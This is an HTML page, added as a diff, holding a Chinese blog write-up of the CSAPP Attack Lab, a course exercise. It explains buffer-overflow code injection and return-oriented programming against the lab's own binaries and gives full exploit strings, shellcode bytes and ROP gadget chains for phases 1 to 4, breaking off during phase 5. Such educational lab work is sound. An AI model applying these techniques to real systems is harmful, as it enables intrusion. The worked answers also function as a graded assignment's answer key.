@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>CSAPP-attacklab 解题思路记录 - 找一个吃麦旋风的理由</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="zero4drift" />
+  <meta name="description" content="准备 官方 lab 主页 lab 的指导文档是必须看的，阅读官网页面上此 lab 的 pdf 格式的指 导文件，其中详细记录每一个破解操作的要求，少走很多弯路； 在 CSAPP Lab Assginments 官网上包" />
+
+  <meta name="keywords" content="代码, 算法, 工具" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.48" />
+
+
+<link rel="canonical" href="https://zero4drift.github.io/post/csapp-attacklab-jie-ti-si-lu-ji-lu/" />
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.28854364c052ec02eba4ee5867bc889d3a567cdf337ba3a355c33511d20bee1e.css" integrity="sha256-KIVDZMBS7ALrpO5YZ7yInTpWfN8ze6OjVcM1EdIL7h4=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="CSAPP-attacklab 解题思路记录" />
+<meta property="og:description" content="准备 官方 lab 主页 lab 的指导文档是必须看的，阅读官网页面上此 lab 的 pdf 格式的指 导文件，其中详细记录每一个破解操作的要求，少走很多弯路； 在 CSAPP Lab Assginments 官网上包" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://zero4drift.github.io/post/csapp-attacklab-jie-ti-si-lu-ji-lu/" /><meta property="article:published_time" content="2018-02-03T14:32:00&#43;08:00"/>
+<meta property="article:modified_time" content="2019-01-14T22:23:38&#43;08:00"/>
+<meta itemprop="name" content="CSAPP-attacklab 解题思路记录">
+<meta itemprop="description" content="准备 官方 lab 主页 lab 的指导文档是必须看的，阅读官网页面上此 lab 的 pdf 格式的指 导文件，其中详细记录每一个破解操作的要求，少走很多弯路； 在 CSAPP Lab Assginments 官网上包">
+
+
+<meta itemprop="datePublished" content="2018-02-03T14:32:00&#43;08:00" />
+<meta itemprop="dateModified" content="2018-02-03T14:32:00&#43;08:00" />
+<meta itemprop="wordCount" content="4394">
+
+
+
+<meta itemprop="keywords" content="csapp-lab,c," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CSAPP-attacklab 解题思路记录"/>
+<meta name="twitter:description" content="准备 官方 lab 主页 lab 的指导文档是必须看的，阅读官网页面上此 lab 的 pdf 格式的指 导文件，其中详细记录每一个破解操作的要求，少走很多弯路； 在 CSAPP Lab Assginments 官网上包"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">找一个吃麦旋风的理由</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://zero4drift.github.io/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://zero4drift.github.io/post/">存档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://zero4drift.github.io/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://zero4drift.github.io/categories/">分类</a>
+          
+        
+      </li>
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      找一个吃麦旋风的理由
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://zero4drift.github.io/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://zero4drift.github.io/post/">存档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://zero4drift.github.io/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://zero4drift.github.io/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">CSAPP-attacklab 解题思路记录</h1>
+      
+      <div class="post-meta">
+        <time datetime="2018-02-03" class="post-time">
+          2018-02-03
+        </time>
+        <div class="post-category">
+            <a href="https://zero4drift.github.io/categories/csapp/"> CSAPP </a>
+            
+          </div>
+        
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#准备">准备</a></li>
+<li><a href="#破解">破解</a>
+<ul>
+<li><a href="#phase-1">phase_1</a></li>
+<li><a href="#phase-2">phase_2</a></li>
+<li><a href="#phase-3">phase_3</a></li>
+<li><a href="#phase-4">phase_4</a></li>
+<li><a href="#phase-5">phase_5</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+
+<h2 id="准备">准备</h2>
+
+<ol>
+<li><a href="http://www.baidu.com/link?url%3DYp2%5FMbsZGzDA3r8TVeySxRoTigACMN3YVMUcJKVK%5Fk4enAAayCJAyqsNra%5FONMPZ&amp;wd%3D&amp;eqid%3Df22ab52e00016e08000000065a772b7a">官方 lab 主页</a> lab 的指导文档是必须看的，阅读官网页面上此 lab 的 pdf 格式的指
+导文件，其中详细记录每一个破解操作的要求，少走很多弯路；</li>
+<li>在 CSAPP Lab Assginments 官网上包含二进制可执行文件的压缩包不能在 Windows 平
+台下解压缩，否则在 Linux 平台上运行时会出现权限问题（当然，也可以用 <code>chmod
+   777 xxx</code> 解决，不过没必要）；</li>
+<li><code>./ctarget</code> 这样的命令会出现 <em>illegal host&hellip;</em> 错误，后面加个 <code>-q</code> 命令就好了，不让程序发送结果
+到评分服务器；</li>
+<li>自带的 HEX2RAW 程序会将16进制数据转换为字符串，输入的16进制数据格式必须是两位
+16进制数，之间用空格隔开；</li>
+<li>机器内二进制数据表示都是小端法；</li>
+</ol>
+
+<h2 id="破解">破解</h2>
+
+<blockquote>
+<p>Now attack!</p>
+</blockquote>
+
+<p>共有5个破解任务：</p>
+
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Program</th>
+<th>Level</th>
+<th>Method</th>
+<th>Function</th>
+<th>Points</th>
+<th>Index</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>1</td>
+<td>CTARGET</td>
+<td>1</td>
+<td>CI</td>
+<td>touch1</td>
+<td>10</td>
+<td><a href="#phase-1">phase_1</a></td>
+</tr>
+
+<tr>
+<td>2</td>
+<td>CTARGET</td>
+<td>2</td>
+<td>CI</td>
+<td>touch2</td>
+<td>25</td>
+<td><a href="#phase-2">phase_2</a></td>
+</tr>
+
+<tr>
+<td>3</td>
+<td>CTARGET</td>
+<td>3</td>
+<td>CI</td>
+<td>touch3</td>
+<td>25</td>
+<td><a href="#phase-3">phase_3</a></td>
+</tr>
+
+<tr>
+<td>4</td>
+<td>RTARGET</td>
+<td>2</td>
+<td>ROP</td>
+<td>touch2</td>
+<td>35</td>
+<td><a href="#phase-4">phase_4</a></td>
+</tr>
+
+<tr>
+<td>5</td>
+<td>RTARGET</td>
+<td>3</td>
+<td>ROP</td>
+<td>touch3</td>
+<td>5</td>
+<td><a href="#phase-5">phase_5</a></td>
+</tr>
+</tbody>
+</table>
+
+<ol>
+<li>CI（代码注入）方式来破解的 Ctarget 可执行文件运行栈位置是不变的；</li>
+<li>ROP（返回导向）方式来破解的 Rtarget 这个可执行代码文件的运行时栈位置每次运行
+都不同的；而且它在栈中的代码是不可执行的，否则会引起 Segmentation Fault，所以
+不能用代码注入的方式来破解；</li>
+</ol>
+
+<h3 id="phase-1">phase_1</h3>
+
+<ol>
+<li><p>要求在 Ctarget 执行时在 test 函数执行完成 <code>val = getbuf()</code> 完成后转移到
+touch1 函数执行而不是打印，几个函数的源代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="nf">getbuf</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>  <span class="cm">/* BUFFER_SIZE 是一个常量 */</span>
+  <span class="n">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>  <span class="cm">/* 破解的切入点 */</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">test</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
+  <span class="n">val</span> <span class="o">=</span> <span class="n">getbuf</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;No exploit. Getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">touch1</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Touch1!: You called touch1()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="n">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div></li>
+
+<li><p>切入点是 getbuf 函数，它调用的 Gets 函数与C库函数 gets 功能类似，但引入了一个
+漏洞。它为 buf 这个变量在栈中分配了空间，如果输入的字符串长度超过 BUFFER_SIZE
+指定的长度，Gets 就会将多的字符数据覆盖到不属于这个 buf 变量的栈空间中（试试看
+<code>./ ctarget 一个超长字符串</code> ，会报 Segment Fault）；</p></li>
+
+<li><p>在调用函数前，会将调用结束后的下一个指令的地址存放于栈中 <code>push %rip</code> ，当调用
+函数返回时，就会从栈中取回地址并继续运行；</p></li>
+
+<li><p>所以我们需要找办法用 touch1 首地址覆盖掉第3步中提及的地址，在这里就是利用
+Gets 函数的漏洞，将这个地址放置于输入的字符串中；</p></li>
+
+<li><p>首先确定 touch1 函数的虚拟地址：0x4017c0；</p></li>
+
+<li><p>查看 ctarget 反编译代码中 getbuf 为了创建这个字符数组 buf 占用了多少栈空间：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">4017a8: 48 83 ec 28             sub    $0x28,%rsp
+4017ac: 48 89 e7                mov    %rsp,%rdi
+4017af: e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</code></pre></td></tr></table>
+</div>
+</div>
+<p>占用了40个内存地址的空间，也就是说最多只能输入40个字符，而当前的栈底部+8的位
+置就存储了此次调用结束后的返回地址；</p></li>
+
+<li><p>只需要将 0x4017c0 扩展成 0x004017c0，因为是64位系统，地址占据了8个地址的空间，
+小端法所以输入时应该是 c0 17 40 00，前面还应该有40个字符，全填0就可以了；</p></li>
+
+<li><p>使用 HEX2RAW 将数据转换成字符串（最好是保存在文件中）， <code>./ctardgt -q -i file</code> 即可。</p></li>
+</ol>
+
+<h3 id="phase-2">phase_2</h3>
+
+<ol>
+<li><p>要求在 test 函数中调用 getbuf 函数返回后，进入 touch2 函数调用，而不是原来的
+打印一串字符，touch2 代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Misfire!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+    <span class="n">fail</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>本题唯一和 phase_1 不同的地方在与，不仅需要代码注入从而跳到别的函数处执行，还
+要在代码注入中为这个函数准备参数；不允许使用 jump 或者 call 指令；</p></li>
+
+<li><p>函数调用前，它的第一个参数是存放在 %rdi 中的，最多有6个整型或指针型参数通过寄
+存器传送，操作数宽度是8字节时，寄存器使用顺序依次是 %rdi %rsi %rdx %rcx %r8
+%r9；</p></li>
+
+<li><p>cookie 的值 lab 中已经给出：0x59b997fa；touch2 函数的首地址是：0x4017ec；</p></li>
+
+<li><p>要想实现题目要求的效果：</p>
+
+<ol>
+<li>首先需要和 phase_1 一样替换 getbuf 调用后的返回地址，替换成什么呢？注意，
+并不是替换成 touch2 函数的首地址，这样的话参数验证就不正确了；</li>
+<li>正确做法是把那个返回地址替换为 getbuf 中 %rsp 处的值，也就是 buf 变量存储
+空间开始的地方；</li>
+<li>注入的代码应该放置在 buf 的存储位置处，这样 getbuf 调用完成后就会跳转到这
+个位置并运行其中存储的机器码；</li>
+<li>使用 gdb 获得 getbuf 中 %rsp 寄存器的值，是 0x5561dc78</li>
+</ol></li>
+
+<li><p>注入的代码功能是：将 cookie 的值传入 %edi 寄存器中，将 touch2 的代码推入栈中，
+然后返回，这样就可以正确的参数调用 touch2，汇编代码就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">mov $0x59b997fa,%rdi
+pushq $0x4017ec
+ret</code></pre></td></tr></table>
+</div>
+</div>
+<p>相应的机器码就是 bf fa 97 b9 59 68 ec 17 40 00 c3</p></li>
+
+<li><p>输入的最后应该是 78 dc 61 55，中间全部用00 填充。</p></li>
+</ol>
+
+<h3 id="phase-3">phase_3</h3>
+
+<ol>
+<li><p>和 phase_2 类似，但是传递的参数不是 cookie 的值，中间跳转到的函数是 touch3，
+传入给它的参数是一个特殊的字符串，代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">cbuf</span> <span class="o">+</span> <span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
+  <span class="n">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;%.8x&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+  <span class="cm">/* 将无符号整数 val 的值按格式化字符串格式化，输出到 s 指向的字符串 */</span>
+  <span class="k">return</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="cm">/* 比较 sval 和 s 指向的字符串的前9个字节 */</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Touch3!: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span> <span class="cm">/* 必须匹配 */</span>
+    <span class="n">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
+    <span class="n">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div></li>
+
+<li><p>注意：</p>
+
+<ul>
+<li>在 getbuf 函数中通过 <code>sub 28,%rsp</code> 给 buf 变量分配存储空间，存储输入的
+字符串；</li>
+<li>在 getbuf <strong>退栈</strong> 返回后调用 touch3 函数时，touch3 函数以及其内部调用
+hexmatch 和 strncmp 又会使栈增长，特别是，hexmatch 函数内部为变量分配了 110
+个地址空间，这个已经完全包括了原来 getbuf 中分配的40个地址空间了；</li>
+<li>而且因为 hexmatch 函数内部指向字符串的指针 s 的首地址是在这110个地址空间的
+前99个地址中随机生成的，在地址 s 处写入数据有可能将 getbuf 中存储在其40个地
+址空间的数据覆盖；</li>
+<li>sval 如果指向的是 getbuf 中分配的地址空间中的一个，它指向的数据被覆盖的话，
+strncmp 就会引用不正确的内容；更不用提 strncmp 也可能会增长栈并覆写数据；</li>
+</ul></li>
+
+<li><p>根据第2条，这一次注入的代码不应该在 getbuf 的40个存储空间中，它应该上探到
+test 函数的栈空间中（或者再上探），毕竟在这一系列的调用中，test 没有退栈，而
+且 touch3 退出时使用了 <code>exit(0)</code> ，test 的栈中数据被覆盖不会造成错误；</p></li>
+
+<li><p>确认 touch3 函数的首地址是：0x4018fa，cookie是：0x59b997fa，因为 hexmatch 中
+是与它的字符串表示作比较，对应 ASCII 码转换成字符串&rdquo;59b997fa&rdquo;后的16进制表示是：
+35 39 62 39 39 37 66 61 00（最后一个 \0 表示字符串结束，所以这里是9个字符，这
+也是为什么 hexmatch 中要比较9个字节）</p></li>
+
+<li><p>注入的代码和 phase_2 中类似，只是注入的位置不同：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">push $0x0  # 保险起见将字符串后一段数据位全设置为0（0x00 表示 \0）
+movq $0x6166373939623935,%rax  # x86-64 中的 trick pushq 最大接受32位的立即数
+pushq %rax  # 压栈
+movq %rsp,%rdi  # 将字符串保存的首地址送 %rdi
+pushq $0x4018fa
+ret</code></pre></td></tr></table>
+</div>
+</div>
+<p>相应的机器码就是 6a 00 48 b8 35 39 62 39 39 37 66 61 50 48 89 e7 68 fa 18 40
+00 c3</p></li>
+
+<li><p>跳转地址就不能在 getbuf 中栈增长后的 %rsp ~ %rsp+40 这个地址范围内了，为了方
+便，注入代码就存储在紧靠存储返回地址的区域，既然是通过 pushq 指令压入数据并使
+栈增长，指向这个字符串的指针就是 pushq 之后 $rsp 的值；</p></li>
+
+<li><p>输入的字符串的16进制表示就得是：前40个字节都是 00 ，a8 dc 61 55 后还应该加四
+组00 ，因为这是一个64位地址，取返回地址时是64位一起取的，然后再加上转换得到的
+机器码；</p></li>
+
+<li><p>最后是 00 00 &hellip; a8 dc 61 55 00 00 00 00 6a 00 48 b8 35 39 62 39 39 37 66 61
+50 48 89 e7 68 fa 18 40 00 c3</p></li>
+</ol>
+
+<h3 id="phase-4">phase_4</h3>
+
+<ol>
+<li>这里使用了 Return-Oriented 的方式，详细介绍及具体的破解要求、辅助说明见 lab
+的指导文档；</li>
+<li>就如指导文件中所说的，这次破解只需要跳转两个 gadget：一个包含了 <code>popq %rax</code>
+，一个包含了 <code>movq %rax,%rdi</code> ，它们的二进制表示分别是 <code>58</code> <code>48 89 c7</code> ，还有
+<code>nop</code> 指令使程序计数器加1，二进制表示是 <code>90</code> ，还有 <code>ret</code> 返回指令，二进制表
+示是 <code>c3</code> ；</li>
+
+<li><p>上面提到的两个 gadget 在反编译 rtarget 的汇编代码文件中是这样的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">00000000004019a7 &lt;addval_219&gt;:
+4019a7: 8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
+4019ad: c3
+...
+00000000004019a0 &lt;addval_273&gt;:
+4019a0: 8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
+4019a6: c3</code></pre></td></tr></table>
+</div>
+</div></li>
+
+<li><p>实现的功能就是从 getbuf 返回后，进入 0x4019ab 处执行使 0x59b997fa 弹出栈保存
+在 %rax 寄存器中，然后进入 0x4019a2 处执行，将 %rax 的内容送到 %rdi 寄存器处，
+最后进入 %0x4017ec 处执行 touch2 的指令；</p></li>
+
+<li><p>所以最后的结果用16进制来表示就是 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab
+19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40
+00 00 00 00 00</p></li>
+</ol>
+
+<h3 id="phase-5">phase_5</h3>
+
+<ol>
+<li>虽然本题只有5分，但据文档中所说，这道题是最难的，属于加分题，实在完成不了分数
+损失也不大；</li>
+<li>由于要传递指针，这次在输入字符串中应该包含 cookie &ldquo;0x59b997fa&rdquo; 的
+ASCII 表示，传递的参数就是这个字符串的首地址；</li>
+<li>思路大体来说是这样：
+
+<ol>
+<li>为了不影响栈内存储地址，将 cookie 字符串的数据放在输入最后；</li>
+<li>getbuf 返回后应当进入的函数（或者跳转几个函数）应该实现将 cookie 字符串的
+首地址传送给 %rdi</li>
+<li>最后进入 touch3 函数的指令块，地址是；0x4018fa；</li>
+</ol></li>
+<li>具体实现：将 cookie 字符串首地址存放在 touch3 函数地址存储后，在调用 touch3
+函数前计算获得 cookie 字符串的首地址，如何做：
+
+<ol>
+<li>计算偏移量，
+
+<ol>
+<li>在跳转到 touch3 前的最后几次跳转依次是
+
+<ol>
+<li>取得当前栈顶，将当前的 %rsp 送给 %rax（当前跳转地址已弹出）；</li>
+<li>将 %rax 送 %rdi；</li>
+<li>将 %rdi 与偏移量相加，结果存储在 %rax 中；</li>
+<li>将 $rax 送 %rdi;</li>
+</ol></li>
+<li>上面提及的每次跳转地址都在栈中占据8个地址空间，连 touch3 的跳转地址包括
+在内，偏移量应该是 <strong>32</strong>;</li>
+</ol></li>
+<li>使用指令获得偏移量
+
+<ol>
+<li>getbuf 结束之后应该执行指令计算偏移量</li>
+<li>注意到 farm 里面有一个非常特别的函数，地址是 0x4019d6，实现了 <code>lea
+         (%rdi,%rsi,1),%rax</code> ，在跳转到 touch3 前取得的 %rsp 寄存器中的值离
+cookie 字符串的栈地址还有距离。现在必需通过多次重复加法来获得正确的字符
+串首地址；</li>
+<li>通过“加一”这个关键词，搜索到 farm 中有一个直接给 %eax 传送1的函数，地址
+是 0x4019d0；</li>
